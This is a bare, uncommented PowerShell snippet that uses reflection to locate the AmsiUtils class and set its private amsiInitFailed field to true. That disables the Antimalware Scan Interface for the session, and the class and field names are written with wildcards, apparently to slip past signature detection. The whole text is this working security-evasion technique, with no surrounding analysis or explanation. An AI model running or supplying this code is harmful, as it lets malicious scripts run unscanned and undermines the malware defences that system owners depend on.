$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}}
$g=$f.SetValue($null,$true)
